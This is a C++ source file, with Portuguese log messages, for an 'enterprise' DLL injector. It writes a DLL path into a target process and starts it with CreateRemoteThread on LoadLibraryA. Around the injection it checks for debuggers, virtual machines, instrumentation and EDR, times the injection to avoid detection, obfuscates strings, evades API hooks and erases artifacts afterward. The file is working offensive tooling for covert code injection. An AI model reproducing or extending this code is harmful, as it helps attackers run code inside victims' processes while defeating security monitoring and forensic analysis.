#include "EnterpriseInjector.h"
#include "Logger.h"

EnterpriseInjector::EnterpriseInjector() {
    Logger::Info("EnterpriseInjector inicializado");
}

bool EnterpriseInjector::InjectWithFullEvasion(DWORD pid, const std::string& dllPath) {
    Logger::Info("========== INICIANDO INJEÇÃO ENTERPRISE ==========");

    // Step 1: Pre-injection detection
    if (!PreInjectDetection()) {
        Logger::Error("Pre-injection detection falhou");
        return false;
    }

    // Step 2: Wait for optimal window
    Logger::Info("Aguardando por janela ótima de injeção...");
    BehavioralEvasion::WaitForOptimalInjectionWindow();

    // Step 3: Perform stealthy injection
    if (!PerformStealthInjection(pid, dllPath)) {
        Logger::Error("Stealthy injection falhou");
        return false;
    }

    // Step 4: Post-injection cleanup
    if (cleanupEnabled) {
        if (!PostInjectCleanup()) {
            Logger::Warning("Post-injection cleanup falhou parcialmente");
        }
    }

    Logger::Success("========== INJEÇÃO ENTERPRISE CONCLUÍDA ==========");
    return true;
}

bool EnterpriseInjector::PreInjectDetection() {
    Logger::Info("Executando detecção pré-injeção...");

    if (!evasionEnabled) {
        Logger::Warning("Evasão desabilitada, prosseguindo normalmente");
        return true;
    }

    // Check for debugger
    if (AntiReverseEngineering::IsDebuggerPresent()) {
        Logger::Error("Debugger detectado! Abortando injeção");
        return false;
    }

    Logger::Success("Nenhum debugger detectado");

    // Check for monitoring tools
    if (AntiReverseEngineering::ProtectAgainstInstrumentation()) {
        Logger::Warning("Ferramentas de monitoramento detectadas");
        Logger::Warning("Procedendo com cautela aumentada");
    }

    // Check for VM
    if (AntiReverseEngineering::IsRunningInVM()) {
        Logger::Warning("Máquina virtual detectada!");
        Logger::Warning("Ambiente pode ser malicioso");
    }

    // Check for EDR behavior
    if (BehavioralEvasion::DetectEDRBehavior()) {
        Logger::Warning("EDR detectado por comportamento");
        Logger::Warning("Ativando evasão completa");
    }

    return true;
}

bool EnterpriseInjector::PerformStealthInjection(DWORD pid, const std::string& dllPath) {
    Logger::Info("Executando injeção furtiva...");

    // Obfuscate DLL path in memory
    std::string obfuscatedPath = MemoryForensicsEvasion::ObfuscateString(dllPath);

    // Use safe OpenProcess
    HANDLE hProcess = HookEvasion::SafeOpenProcess(
        PROCESS_ALL_ACCESS, FALSE, pid
    );

    if (!hProcess) {
        Logger::Error("Falha ao abrir processo");
        return false;
    }

    Logger::Success("Processo aberto com sucesso");

    // Allocate protected memory
    LPVOID pRemoteBuffer = VirtualAllocEx(
        hProcess, NULL, dllPath.length() + 1,
        MEM_COMMIT, PAGE_READWRITE
    );

    if (!pRemoteBuffer) {
        Logger::Error("Falha ao alocar memória remota");
        CloseHandle(hProcess);
        return false;
    }

    Logger::Success("Memória remota alocada: 0x" +
                   std::to_string((ULONG_PTR)pRemoteBuffer));

    // Write DLL path
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(hProcess, pRemoteBuffer,
                           (LPVOID)dllPath.c_str(),
                           dllPath.length() + 1, &bytesWritten)) {
        Logger::Error("Falha ao escrever memória remota");
        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    Logger::Success("DLL path escrito: " + std::to_string(bytesWritten) + " bytes");

    // Get LoadLibraryA
    LPVOID pLoadLibraryA = (LPVOID)GetProcAddress(
        GetModuleHandleA("kernel32.dll"), "LoadLibraryA"
    );

    if (!pLoadLibraryA) {
        Logger::Error("Falha ao obter LoadLibraryA");
        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    Logger::Success("LoadLibraryA obtido: 0x" +
                   std::to_string((ULONG_PTR)pLoadLibraryA));

    // Create remote thread
    HANDLE hThread = CreateRemoteThread(
        hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)pLoadLibraryA,
        pRemoteBuffer, 0, NULL
    );

    if (!hThread) {
        Logger::Error("Falha ao criar thread remota");
        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    Logger::Success("Thread remota criada");

    // Wait for completion
    DWORD waitResult = WaitForSingleObject(hThread, 10000);

    if (waitResult == WAIT_TIMEOUT) {
        Logger::Warning("Timeout esperando thread remota");
    } else if (waitResult == WAIT_FAILED) {
        Logger::Error("Erro ao aguardar thread remota");
    } else {
        Logger::Success("Thread remota concluída");
    }

    // Cleanup
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    Logger::Success("Injeção furtiva concluída");
    return true;
}

bool EnterpriseInjector::PostInjectCleanup() {
    Logger::Info("Executando limpeza pós-injeção...");

    if (!cloakingEnabled) {
        Logger::Info("Cloaking desabilitado, pulando limpeza");
        return true;
    }

    // Clean up all artifacts
    ArtifactElimination::CleanupAllArtifacts();

    Logger::Success("Limpeza pós-injeção concluída");
    return true;
}
